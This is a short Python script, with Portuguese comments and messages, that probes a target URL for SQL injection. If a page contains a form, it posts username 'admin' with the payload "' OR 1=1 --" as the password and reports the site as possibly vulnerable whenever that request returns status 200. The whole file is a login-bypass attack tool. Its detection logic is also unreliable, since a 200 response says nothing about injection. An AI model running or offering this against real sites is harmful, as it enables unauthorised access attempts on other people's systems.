import requests

def verificar_vulnerabilidade(alvo):
    try:
        resposta = requests.get(alvo)
        if resposta.status_code == 200:
            # Verifique se o site utiliza autenticação por formulário
            if 'form' in resposta.text:
                dados = {"usuario": "admin", "senha": "' OR 1=1 --"}
                resposta_post = requests.post(alvo, data=dados)
                if resposta_post.status_code == 200:
                    print("Site pode ser vulnerável à SQL Injection!")
                else:
                    print("Site não é vulnerável.")
            else:
                print("Site não utiliza autenticação por formulário.")
    except requests.exceptions.RequestException as e:
        print(f"Erro: {e}")

alvo = "(link unavailable)"
verificar_vulnerabilidade(alvo)
